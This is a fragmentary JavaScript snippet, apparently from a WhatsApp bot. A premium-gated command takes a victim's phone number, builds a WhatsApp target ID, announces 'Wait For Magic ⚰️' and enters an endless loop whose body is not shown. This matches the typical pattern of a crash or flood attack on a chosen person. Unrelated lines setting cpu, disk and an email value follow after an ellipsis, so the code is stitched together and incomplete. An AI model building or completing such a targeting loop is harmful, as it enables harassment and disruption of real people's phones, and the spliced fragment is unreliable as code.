...
if (!isPremium) return reply(`You are Not. A premium member`)
if (!q) return reply(`use .${command} 2547392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Number without+ n\n\n<✓> Example : .${command} 2547392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(` Wait For Magic 🪄⚰️`)
  for (;;) {
...
let cpu = "70"
let disk = "2024"
let email = username + "king@sweetrabit.ml"
